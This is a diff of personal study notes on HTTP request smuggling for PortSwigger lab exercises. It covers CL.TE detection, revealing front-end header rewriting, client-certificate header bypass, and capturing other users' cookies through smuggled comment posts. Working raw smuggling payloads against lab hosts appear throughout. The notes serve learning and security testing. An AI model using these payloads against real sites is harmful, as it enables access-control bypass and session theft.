@@ -1044,6 +1044,9 @@ x-nr-external-service: external
 Once you have revealed how the front-end server is rewriting requests, you can apply the necessary rewrites to your smuggled requests, to ensure they are processed in the intended way by the back-end server
 
 ### PRACTITIONER Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting
+Lab description:
+There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the X-Forwarded-For header but has a different name
+
 We need the admin page, but it can only be accessed from localhost
 
 So we first try to add `X-Forwarded-For: 127.0.0.1` header, but we still get Unauthorized, because the frontend server overwrites `X-Forwarded-For` header before it gets to the backend server
@@ -1062,7 +1065,6 @@ x\r\n
 ```
 The response is timing out and that's an indication that there is a CL.TE
 So we've got to confirm that with differential responses:
-
 Norm req:
 ```bash
 POST / HTTP/1.1
@@ -1094,24 +1096,24 @@ So we send attack, norm reqs and we get back 404 Not found. It confirms CL.TE
 Now we try `X-Forwarded-For` header inside our attack req (in the second part of it)
 But we get 401 Unauthorized anyway
 
-So in the lab we have an endpoint that reflects whatever we send in the req body in the response.
+So in the lab we have an endpoint that reflects whatever we send in the req body in the response
 This will be our normal request now:
 ```bash
 POST / HTTP/1.1
-Host: 0a0300650452a219807280f4006b00c5.web-security-academy.net
+Host: labid.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 13
+Content-Length: 11
 
-search=jjjj
+search=norm
 ```
-And `jjjj` is reflected in the response
+And `norm` is reflected in the response
 
-So we craft our attack req:
+So we craft our attack req and send it:
 ```bash
 POST / HTTP/1.1
 Host: 0a0300650452a219807280f4006b00c5.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 105 # 105 includes everything up until `search=jjjj`
+Content-Length: 107 # 107 includes everything up until `search=attack`
 Transfer-Encoding: chunked
 
 0
@@ -1120,26 +1122,26 @@ POST / HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 163
 
-search=jjjj
+search=attack
 ```
-And we send our norm req:
+
+And we now send our norm req:
 ```bash
 POST / HTTP/1.1
 Host: 0a0300650452a219807280f4006b00c5.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 10
+Content-Length: 11
 
-search=jjj
+search=norm
 ```
 And in the response to the normal req we get:
 ```bash
 ...
 <section class=blog-header>
-<h1>0 search results for 'jjjjPOST / HTTP/1.1
-X-qRjKfQ-Ip: 194.44.253.30
-Host: 0a0300650452a219807280f4006b00c5.web-security-academy.net
-Content-Type: application/x-www-form-urlen'
-</h1>
+<h1>0 search results for 'attackPOST / HTTP/1.1
+X-uGpbjy-Ip: 181.33.555.19 # 181.33.555.19 is the ip of the user who makes the req
+Host: 0a02002304de9483800fb2810024008e.web-security-academy.net
+Content-Type: application/x-www-form-url'</h1>
 <hr>
 </section>
 ...
@@ -1152,7 +1154,7 @@ So our attack req that deletes carlos:
 POST / HTTP/1.1
 Host: 0a0300650452a219807280f4006b00c5.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 145
+Content-Length: 145 # 145 is total length, including `x=`
 Transfer-Encoding: chunked
 
 0
@@ -1166,12 +1168,52 @@ x=
 ```
 
 ### Bypassing client authentication
+As part of the TLS handshake, servers authenticate themselves with the client (usually a browser) by providing a certificate. This certificate contains their "common name" (CN), which should match their registered hostname. The client can then use this to verify that they're talking to a legitimate server belonging to the expected domain.
+
+Some sites go one step further and implement a form of mutual TLS authentication, where clients must also present a certificate to the server. In this case, the client's CN is often a username or suchlike, which can be used in the back-end application logic as part of an access control mechanism, for example.
+
+The component that authenticates the client typically passes the relevant details from the certificate to the application or back-end server via one or more non-standard HTTP headers. For example, front-end servers sometimes append a header containing the client's CN to any incoming requests:
+```bash
+GET /admin HTTP/1.1
+Host: normal-website.com
+X-SSL-CLIENT-CN: carlos
+```
+As these headers are supposed to be completely hidden from users, they are often implicitly trusted by back-end servers. Assuming you're able to send the right combination of headers and values, this may enable you to bypass access controls.
+
+In practice, this behavior isn't usually exploitable because front-end servers tend to overwrite these headers if they're already present. However, smuggled requests are hidden from the front-end altogether, so any headers they contain will be sent to the back-end unchanged.
+```bash
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: x-www-form-urlencoded
+Content-Length: 64
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-SSL-CLIENT-CN: administrator
+Foo: x
+```
+
+### Capturing other users' requests
+If the application contains any kind of functionality that allows you to store and later retrieve textual data, you can potentially use this to capture the contents of other users' requests. These may include session tokens or other sensitive data submitted by the user. Suitable functions to use as the vehicle for this attack would be comments, emails, profile descriptions, screen names, and so on.
+
+To perform the attack, you need to smuggle a request that submits data to the storage function, with the parameter containing the data to store positioned last in the request. For example, suppose an application uses the following request to submit a blog post comment, which will be stored and displayed on the blog:
+```bash
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 154
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
+```
+
+
 
 ### PRACTITIONER Lab: Exploiting HTTP request smuggling to capture other users' requests
-First we figure out if it's CL.TE or TE.CL via timing technique and via differential responses
+First we figure out if it's CL.TE or TE.CL via timing technique and later via differential responses (just to confirm what timing technique found)
 Eventually we see that there is CL.TE
 
 To solve the lab we craft an attack request second part of which posts a comment on a page, but it does not post comment right away, it posts that comment as soon as the admin user makes a request to the server, and our poisoned backend server will actually post the admin's cookie and other request info as a blog comment
-
-
 
